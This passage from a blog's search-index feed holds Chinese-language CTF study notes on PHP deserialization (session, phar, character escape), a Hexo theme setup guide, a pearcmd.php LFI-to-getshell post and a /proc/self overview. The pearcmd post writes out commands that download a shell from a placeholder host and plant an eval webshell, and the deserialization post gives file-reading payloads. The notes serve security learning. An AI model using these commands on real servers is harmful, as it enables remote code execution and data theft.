reference，指针引用</td><td>R:&lt;所引用对象的编号&gt;;O:6:”ClassA”:5:{s:3:”age”;i:1;s:3:”name”;s:5:”Tom”;s:4:”sex”;b:1;s:3:”obj”;r:1;s:2:”pr”;R:3;}最前面的class编号是1，然后age编号是2，name编号是3，sex编号是4，obj编号是5，pr编号是6</td></tr><tr><td>U</td><td>Unicode string，Unicode编码的字符串</td><td>U:<length>:”<unicode string>“;</td></tr><tr><td>O</td><td>Object，对象。用来表示实例化对象</td><td>O:&lt;类名长度&gt;:”&lt;类名&gt;”:&lt;字段数量&gt;:{s:名字长度:”第1个属性名字”;第一个属性对应的值;…s:名字长度:”第n个属性名字”;第n个属性对应的值;} 字段名是字符串型，序列化后格式与字符串型数据序列化后的格式相同。字段值可以是任意类型，其序列化后的格式与其所对应的类型序列化后的格式相同。序列化的字段不包括static 和const 声明的静态字段。</td></tr></tbody></table><h2 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h2><blockquote><p>__construct():   &#x2F;&#x2F;构造函数，当对象创建(new)时会自动调用但在unserialize()时是不会自动调用的。<br>__destruct():  &#x2F;&#x2F;析构函数当对象被销毁时会自动调用。<br>__wakeup() :  &#x2F;&#x2F; unserialize()时会自动调用。<br>__invoke():   &#x2F;&#x2F;当尝试以调用函数的方法调用一个对象时，会自动调<br>__call():    &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发<br>__callStatic():   &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发<br>__get():   &#x2F;&#x2F;用于从不可访问的属性读取数据<br>__set():   &#x2F;&#x2F;用于将数据写入不可访问的属性<br>__isset():   &#x2F;&#x2F;在不可访问的属性上调用 isset( )或 empty()触发<br>__unset():   &#x2F;&#x2F;在不可访问的属性上使用 unset()时触发<br>__toString():   &#x2F;&#x2F;把类当作字符串使用时触发<br>__sleep():   &#x2F;&#x2F;serialize()函数会检查类中是否存在一个魔术方法__sleep() .如果存在，该方法会被优先调用。</p></blockquote><p><img src="https://bu.dusays.com/2022/03/31/d6dc2231b70f1.png" alt="image-20220331104801874"></p><h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>PHP session概念: PHP session是一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。它为每个访问者创建一个唯一的id (UID)，并基于这个UID来存储变量。UID存储在cookie 中，亦或通过URL进行传导。</p><p>会话过程: 当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie),如果请求中不包含会话ID信息，PHP就会创建一个新的会话。会话开始之后，PHP就会将会话中的数据设置到$_SESSION变量中。当PHP停止的时候，它会自动读取$_SESSION中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。</p><p>默认情况下，PHP使用内置的文件会话保存管理器（files)来完成会话的保存。可以通过调用函数session_start()来手动开始一个会话。如果配置项 session.auto_start 设置为1，那么请求开始的时候，会话会自动开始。</p><p>PHP脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数session_write_close()来手动关闭会话。</p><p>了解了有关session的概念后，还需要了解php.ini中一些Session配置</p><blockquote><p>session.save_path&#x3D;””  –设置session的存储路径<br>session.save_handler&#x3D;””  –设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)<br>session.auto_start boolen  –指定会话模块是否在请求开始时启动一个会话默认为0不启动<br>session.serialize_handler string  –定义用来序列化&#x2F;反序列化的处理器名字。默认使用php</p></blockquote><h3 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h3><p>PHP中的session中的内容默认是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_PHPSESSID来进行命名的，文件的内容就是session值的序列话之后的内容。<br>session.serialize_handler有如下三种取值</p><table><thead><tr><th>存储引擎</th><th>存储方式</th></tr></thead><tbody><tr><td>php_binary</td><td>键名的长度对应的ASCII字符+键名+经serialize()后的值 <img src="https://bu.dusays.com/2021/09/17/3c3e6bd4475f6.png"></td></tr><tr><td>php</td><td>键名+竖线+经serialize()后的值  <img src="https://bu.dusays.com/2021/09/17/0c878370fb41a.png"></td></tr><tr><td>php_serialize</td><td>（php&lt;5.5.4）经serialize()后的值  <img src="https://bu.dusays.com/2021/09/17/280204f55738a.png"></td></tr></tbody></table><p>linux常见存储session路径</p><pre class=" language-text"><code class="language-text">/var/lib/php5/sess_PHPSESSID/var/lib/php7/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSED</code></pre><h3 id="有-SESSION赋值"><a href="#有-SESSION赋值" class="headerlink" title="有$_SESSION赋值"></a>有$_SESSION赋值</h3><p>Session反序列化漏洞: 当网站序列化存储session与反序列化读取session的方式不同时，就可能导致session反序列化漏洞的产生。一般都是以php_serialize序列化存储session，以PHP反序列化读取session，造成反序列化攻击。<br><img src="https://bu.dusays.com/2021/09/23/f6f2cb1ae3494.png"></p><h3 id="无-SESSION赋值（php-gt-5-4-0）"><a href="#无-SESSION赋值（php-gt-5-4-0）" class="headerlink" title="无$_SESSION赋值（php&gt;5.4.0）"></a>无$_SESSION赋值（php&gt;5.4.0）</h3><p>使用upload_process机制，在$_SESSION中创建一对键值,其中值可控。<br><img src="https://bu.dusays.com/2021/09/24/ec93019455e81.png"></p><p>以Jarvis OJ题目为例：<a href="http://web.jarvisoj.com:32784/">http://web.jarvisoj.com:32784/</a><br>先找到phpinfo页面看配置，自己弄个表单页面</p><pre class=" language-html"><code class="language-html">&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST"enctype="multipart/form-data"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>抓包上传，在123后面添加一个 | 和序列化后的字符串通过返回包得到session，然后再添加到http头再发一遍，<br>payload：</p><p>|O:5:&quot;OowoO&quot;:1:+{s:4:&quot;mdzz&quot;;s:40:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}  </p><p>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:62:&quot;print_r(file_get_contents(&quot;&#x2F;opt&#x2F;lampp&#x2F;temp&#x2F;sess_xxxxxxxxx”));&quot;;}</p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>phar反序列化就是可以在不使用unserialize()函数进行反序列化。<br>phar文件的结构由四个部分组成：<br>stub：phar的文件标识，前面内容不限，但必须以 __HALT_COMPILER();?&gt; 结尾，否则无法识别为phar文件<br>manifest：压缩文件的属性等信息，以序列化的形式存储自定义的 meta-data，这里就是利用点<br>content：压缩文件的内容<br>signature：签名，在文件末尾<br>漏洞原因：使用伪协议 phar:&#x2F;&#x2F; 读取文件时，文件内容被解析成phar对象，然后phar对象内的meta-data信息会被反序列化，因此会造成反序列化漏洞。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>phar文件要能够上传到服务器端<br>要有可用的魔术方法做 “跳板”<br>文件操作函数的参数可控，且 ：、&#x2F; 、phar等特殊字符没有被过滤</p><table><thead><tr><th>受影响的函数</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime()</td><td>filectime()</td><td>file_exists()</td><td>file_get_contents()</td></tr><tr><td>file_put_contents()</td><td>file()</td><td>filegroup()</td><td>fopen()</td></tr><tr><td>fileinode()</td><td>filemtime()</td><td>fileowner()</td><td>fileperms()</td></tr><tr><td>is_dir()</td><td>is_executable()</td><td>is_file()</td><td>is_link()</td></tr><tr><td>is_readable()</td><td>is_writable()</td><td>is_writeable()</td><td>parse_ini_file()</td></tr><tr><td>copy()</td><td>unlink()</td><td>stat()</td><td>readline()</td></tr></tbody></table><h3 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h3><p>注意：要将php.ini 中的 phar.readonly 选项设置为Off，否则无法生成 phar文件</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//设置stub,增加gif文件头 </span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span><span class="token comment" spellcheck="true">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h2 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>在反序列化前，对序列化后的字符串进行替换或者修改，使得字符串的长度发生了变化，通过构造特定的字符串，导致对象注入等恶意操作。<br>php反序列化特性</p><ol><li>PHP在反序列化时，底层代码是以;作为字段的分隔，以}作为结尾(字符串除外)，并且是根据长度判断内容的。</li><li>在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度错误则反序列化就会失败</li><li>对类中不存在的属性也会进行反序列化</li></ol><h3 id="字符变多"><a href="#字符变多" class="headerlink" title="字符变多"></a>字符变多</h3><p>只需要一个变量<br><img src="https://bu.dusays.com/2021/09/29/2a18341829821.png" alt="例题"><br>    此题中对序列化中的x替换为yy，肯能导致字符串长度增加。<br>当传入 u&#x3D;admin，序列化为  a:2:{i:0;s:5:”admin”;i:1;s:3:”aaa”;}<br>替换反序列化后不满足 $a[1]&#x3D;&#x3D;&#x3D;’admin’ 条件。</p><p>​    当传入u&#x3D;xxxxxxxxxxxxxxxxxxx”;i:1;s:5:”admin”;}，此时替换序列化的结果为 当传入u&#x3D;admin,序列化为 <code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:3:&quot;aaa&quot;;&#125;</code><br>反序列化后满足不了$a[1]&#x3D;&#x3D;&#x3D;’admin’条件</p><p>​    当传入 u&#x3D;xxxxxxxxxxxxxxxxxxx”;i:1;s:5:”admin”;}，此时替换序列化的结果为（一般x字符串长度就为xxxxxxxxxx后面那截字符串的长度）</p><p><code>a:2:&#123;i:0;s:38:&quot;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;i:1;s:5:&quot;admin&quot;;&#125; &quot;;i:1;s:3:&quot;aaa&quot;;&#125;</code><br>此时 yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy 的长度刚好为38，不会报错，再加上后面的 ;i:1;s:5:”admin”} 成功反序列化，后面的就被忽略了</p><h3 id="字符变少"><a href="#字符变少" class="headerlink" title="字符变少"></a>字符变少</h3><p>需要两个变量<br><img src="https://bu.dusays.com/2021/09/29/59af9ddd93206.png" alt="例题"></p><p>要想得到flag，就要使得 “;i:2;s:5:”admin”;}，长度为19，经过观察序列化后 “;i:1;s: 这部分是不会改变的，因为整个payload肯定是不超过100个字符的，所以加上后面的长度 “;i:1;s:xx:” 为12个字符，这里存在着sec的替换，我们可以输入4个sec替换为空格，刚好空出12个字符，可以将”;i:1;s:xx:”这12个字符反序列化后在第一个元素值中，使得后面逃匿。<br>最后payload<br>u&#x3D;secsecsecsec&amp;p&#x3D;”;i:1;s:4:”eval”;i:2;s:5:”admin”;}<br>也可以多添加几个sec，假设为5个，此时空出15个字符，减去”;i:1;s:xx:”这12个字符，还剩下3个，可以再输入三个字符填充。<br>u&#x3D;secsecsecsecsec&amp;p&#x3D;123”;i:1;s:4:”eval”;i:2;s:5:”admin”,}</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><h3 id="php7-1之后对类属性不敏感"><a href="#php7-1之后对类属性不敏感" class="headerlink" title="php7.1之后对类属性不敏感"></a>php7.1之后对类属性不敏感</h3><p>7.1之前,如果变量前是protected，序列化结果会在变量名前加上\x00*\x00<br>8.但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没\x00*\x00也依然会输出 abc</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">test</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string">'abc'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">'O:4:"test":1:&amp;#123;s:1:"a";s:3:"abc";&amp;#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="phar-x2F-x2F-不能出现在首部"><a href="#phar-x2F-x2F-不能出现在首部" class="headerlink" title="phar:&#x2F;&#x2F;不能出现在首部"></a>phar:&#x2F;&#x2F;不能出现在首部</h3><p>这时候可以使用compress.zlib:&#x2F;&#x2F;或compress.bzip2:&#x2F;&#x2F;或zlib:&#x2F;&#x2F;<br>(有些环境加斜线不成功)</p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+gitee博客搭建</title>
      <link href="/2022/03/15/bo-ke-you-hua/"/>
      <url>/2022/03/15/bo-ke-you-hua/</url>
      
        <content type="html"><![CDATA[<p>之前也弄过一个博客，但后面有段时间没有更了，想对页面优化一下，结果忘记之前搞了哪些东西。现在重新搞个主题搭建吧。记录一下，免得后面想做更改又不知道改了啥。</p><p>这次的主题是matery，博客的配置文件就不说了，主要是matery的配置文件。</p><h2 id="主题背景图颜色"><a href="#主题背景图颜色" class="headerlink" title="主题背景图颜色"></a>主题背景图颜色</h2><p>搭在本地后，首先看到首页的一片紫色在背景图上</p><p><img src="https://bu.dusays.com/2022/03/16/99c222819792a.png" alt="image-20220316101443965"></p><p>看不惯，在<code>/themes/source/css/matery.css</code>中，将下面两个注释掉</p><pre class=" language-css-text"><code class="language-css-text">@-webkit-keyframes rainbow &#123;   /* 动态切换背景颜色. */&#125;@keyframes rainbow &#123;    /* 动态切换背景颜色. */&#125;</code></pre><p>一直有一个问题，首页封面的图片没有切换的按钮，不知道是不是没有那个css的问题，禁用了。</p><h2 id="网站访问量"><a href="#网站访问量" class="headerlink" title="网站访问量"></a>网站访问量</h2><p>修改主题的配置文件<code>_config.yml</code>属性</p><p>访问量有些异常，修改<code>themes\matery\layout\_partial\footer.ejs</code>文件的部分代码，全局搜索<img src="E:\MyBlog-matery\source_posts\image-20220414200133580.png" alt="image-20220414200133580"></p><p>修改两个<code>&lt;span&gt;</code>标签，添加<code>style=&#39;display:none&#39;</code></p><h2 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h2><p>我还弄了文字统计，安装<a href="https://github.com/willin/hexo-wordcount">hexo-wordcount</a>插件，在主题配置文件修改相关项为true</p><pre class=" language-shell"><code class="language-shell">npm i --save hexo-wordcount</code></pre><pre class=" language-yml"><code class="language-yml">postInfo:  date: true  # 发布时间  update: false  # 更新时间  wordCount: true # 设置文章字数统计为 true  totalCount: true # 设置站点文章总字数统计为 true  min2read: true # 阅读时长  readCount: true # 阅读次数</code></pre><h2 id="中文拼音链接"><a href="#中文拼音链接" class="headerlink" title="中文拼音链接"></a>中文拼音链接</h2><p>当你的文章标题有中文的时候，生成的永久链接会将中文编码，搞成一大长串，这时可以来个插件将链接设置为中文拼音，安装<a href="https://github.com/viko16/hexo-permalink-pinyin">hexo-permalink-pinyin</a>插件</p><pre class=" language-shell"><code class="language-shell">npm i hexo-permalink-pinyin --save</code></pre><p>然后在博客跟目录下的<code>_config.yml</code>文件中添加</p><pre class=" language-yml"><code class="language-yml">permalink_pinyin:  enable: true  separator: '-' # default: '-'</code></pre><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><p>用的是<a href="https://github.com/wzpan/hexo-generator-search">hexo-generator-search</a>插件</p><pre class=" language-shell"><code class="language-shell">npm install hexo-generator-search --save</code></pre><p>然后在博客跟目录下的<code>_config.yml</code>文件中添加</p><pre class=" language-yml"><code class="language-yml">search:  path: search.xml  field: post</code></pre><h2 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h2><p>用的是<a href="https://github.com/ele828/hexo-prism-plugin">hexo-prism-plugin</a>插件</p><pre class=" language-shell"><code class="language-shell">npm i -S hexo-prism-plugin</code></pre><p>然后在博客跟目录下的<code>_config.yml</code>中添加，把原先的设置为false</p><pre class=" language-yml"><code class="language-yml">highlight:  enable: falseprism_plugin:  mode: 'preprocess'    # realtime/preprocess  theme: 'tomorrow'  line_number: false    # default false  custom_css:</code></pre><h2 id="导航栏颜色"><a href="#导航栏颜色" class="headerlink" title="导航栏颜色"></a>导航栏颜色</h2><p>在<code>/themes/matery/source/css/matery.css</code>中修改<code>.bg-color</code></p><pre class=" language-css"><code class="language-css"><span class="token number">.</span>bg-color &amp;<span class="token hexcode">#123</span><span class="token punctuation">;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right, <span class="token hexcode">#4cbf30</span> <span class="token number">0%</span>, <span class="token hexcode">#0f9d58</span> <span class="token number">100%</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     //修改成自己喜欢的颜色值    <span class="token property">opacity</span><span class="token punctuation">:</span> <span class="token number">0.8</span><span class="token punctuation">;</span>      //透明效果 值范围 <span class="token number">0</span>~<span class="token number">1</span>&amp;<span class="token hexcode">#125</span><span class="token punctuation">;</span></code></pre><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>最后还可以对主题的图片进行更换，只要保持数量一致就行，不然还得去修改其他文件，当然去网上找的图片可能有点大，需要去压缩一下（我有张背景图15M，加载老半天，后面改了），安利一个找壁纸的网站吧，感觉还行<a href="https://wallhaven.cc/">wallhaven.cc</a></p><p>大概就这些吧，还有更多设置可以去下面的站习一波</p><p><a href="https://lavender-z.github.io/talk/">https://lavender-z.github.io/talk/</a></p><p><a href="http://jaav.com.cn/posts/a654.html">http://jaav.com.cn/posts/a654.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用pearcmd.php从LFI到getshell</title>
      <link href="/2021/11/22/li-yong-pearcmd-php-cong-lfi-dao-getshell/"/>
      <url>/2021/11/22/li-yong-pearcmd-php-cong-lfi-dao-getshell/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>再复现之前打湖湘杯比赛的时候遇到了这个，新知识，看着p神的笔记学习一波</p><p><a href="https://tttang.com/archive/1312/">https://tttang.com/archive/1312/</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li><p>安装了pear</p></li><li><p>开启了<code>register_argc_argv</code></p></li><li><p>存在文件包含</p></li></ul><span id="more"></span><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>那先说说pear，pear是pecl依赖的类库，pecl是php中用于管理扩展的命令行，在PHP7.3之前都是默认安装的，7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。但在Docker任意版本镜像中都是默认安装的，安装的默认路径是<code>/usr/local/lib/php</code></p><p><code>register_argc_argv</code>默认是On的，但只要配置了php.ini，那就为Off，当这个参数开启的时候，php会注册argc和argv这个全局变量，我们可以从$_SERVER[‘argv’] 中获取到这些值。argv以<code>+</code>作为分隔符</p><p>pear本身是一个sh程序，它调用了<code>pearcmd.php</code>。这里忽略一些细节，只需要知道，pearcmd.php中<code>$argv</code>就是通过<code>$_SERVER[&#39;argv&#39;]</code>来获取到的。</p><p>这样就通过包含<code>pearcmd.php</code>，利用<code>$_SERVER[&#39;argv&#39;]</code>来调用pear命令。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h3><p>我们可以利用它的下载功能下载shell文件，再去包含</p><pre class=" language-shell"><code class="language-shell">pear install -R /tmp http://xxxxxxx/shell.php-R可以指定下载文件保存的目录</code></pre><h3 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h3><pre class=" language-shell"><code class="language-shell">pear -c /tmp/.lees.php -d man_dir=<?=eval($_POST[0]);?> -s</code></pre><p>pear命令</p><pre class=" language-text"><code class="language-text"># pear help optionsOptions:     -v         increase verbosity level (default 1)     -q         be quiet, decrease verbosity level     -c file    find user configuration in `file'     -C file    find system configuration in `file'     -d foo=bar set user config variable `foo' to `bar'     -D foo=bar set system config variable `foo' to `bar'     -G         start in graphical (Gtk) mode     -s         store user configuration     -S         store system configuration     -u foo     unset `foo' in the user configuration     -h, -?     display help/usage (this message)     -V         version information</code></pre><p>所以就相当于写配置到<code>/tmp/.lees.php</code>了，内容和文件名都可控，那就可以个shell包含，直接上蚁剑了。</p><p>参考：<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/">register_argc_argv与include限制php任意文件下载的小结</a></p><p><a href="https://tttang.com/archive/1312/">Docker PHP裸文件本地包含综述</a></p><p><a href="https://github.com/bfengj/CTF/blob/main/Web/php/%E5%88%A9%E7%94%A8pearcmd.php%E4%BB%8ELFI%E5%88%B0getshell.md">利用pearcmd.php从LFI到getshell</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux的/proc/self/学习</title>
      <link href="/2021/10/23/linux-de-proc-xia-de-self-xue-xi/"/>
      <url>/2021/10/23/linux-de-proc-xia-de-self-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="x2F-proc目录"><a href="#x2F-proc目录" class="headerlink" title="&#x2F;proc目录"></a>&#x2F;proc目录</h2><p>&#x2F;proc是一个虚拟文件系统。它有时也被称为进程信息伪文件系统，它提供了一种内核数据结构的接口。它不包含真实的文件，而是包含运行时系统信息（例如系统内存、安装的设备、硬件配置等）。它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p><span id="more"></span><p>大多数文件都是只读的，但有些文件是只读的，有些文件是可写的，允许更改内核变量。因此，它可以被视为内核的控制和信息中心。另外，在&#x2F;proc下还有三个很重要的目录：net，scsi和sys。sys目录是可写的，可以通过它来访问或修改内核的参数，而net和scsi则依赖于内核配置。例如，如果系统不支持scsi，则scsi 目录不存在。</p><p><img src="https://bu.dusays.com/2021/10/24/6dd36e9eed924.png"></p><p>以数字命名的目录，他们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在&#x2F;proc下。</p><p>查看进程表，您可以将进程与关联的进程 ID (PID)进行匹配。</p><p><img src="https://bu.dusays.com/2021/10/24/0cae627bb4c35.png"></p><p>您可能想知道如何查看文件大小为 0 的进程的详细信息。如果将其视为进入内核的窗口会更有意义。该文件实际上不包含任何数据；它只是作为指向实际进程信息所在位置的指针。</p><p><img src="https://bu.dusays.com/2021/10/24/a632d59ea757e.png"></p><ul><li>&#x2F;proc&#x2F;PID&#x2F;cmdline ——命令行参数。</li><li>&#x2F;proc&#x2F;PID&#x2F;CPU ——执行它的当前和最后一个 cpu。</li><li>&#x2F;proc&#x2F;PID&#x2F;cwd ——链接到当前工作目录。</li><li>&#x2F;proc&#x2F;PID&#x2F;environ ——环境变量的值。</li><li>&#x2F;proc&#x2F;PID&#x2F;exe ——链接到此过程的可执行文件。</li><li>&#x2F;proc&#x2F;PID&#x2F;fd ——目录，其中包含所有<a href="https://blog.csdn.net/yushuaigee/article/details/107883964">文件描述符</a>。每个进程默认打开 0(标准输入)、1(标准输出)、2(标准错误) 三个文件描述符。</li><li>&#x2F;proc&#x2F;PID&#x2F;maps ——内存映射到可执行文件和库文件。</li><li>&#x2F;proc&#x2F;PID&#x2F;mem ——此进程持有的内存。</li><li>&#x2F;proc&#x2F;PID&#x2F;root ——链接到此进程的根目录。</li><li>&#x2F;proc&#x2F;PID&#x2F;stat ——进程状态。</li><li>&#x2F;proc&#x2F;PID&#x2F;statm ——进程内存状态信息。</li><li>&#x2F;proc&#x2F;PID&#x2F;status ——进程状态信息。</li><li>&#x2F;proc&#x2F;self ——表示当前进程目录。</li></ul><h2 id="x2F-proc-x2F-self利用"><a href="#x2F-proc-x2F-self利用" class="headerlink" title="&#x2F;proc&#x2F;self利用"></a>&#x2F;proc&#x2F;self利用</h2><p>深入学习：</p><p><a href="https://man7.org/linux/man-pages/man5/proc.5.html">Linux 程序员手册 PROC(5)</a></p><p><a href="https://blog.cloudflare.com/diving-into-proc-pid-mem/">深入 &#x2F;proc&#x2F;[pid]&#x2F;mem</a></p><p><a href="https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/">Linux 文件系统层次结构</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/2021/10/15/python-pickle-fan-xu-lie-hua/"/>
      <url>/2021/10/15/python-pickle-fan-xu-lie-hua/</url>
      
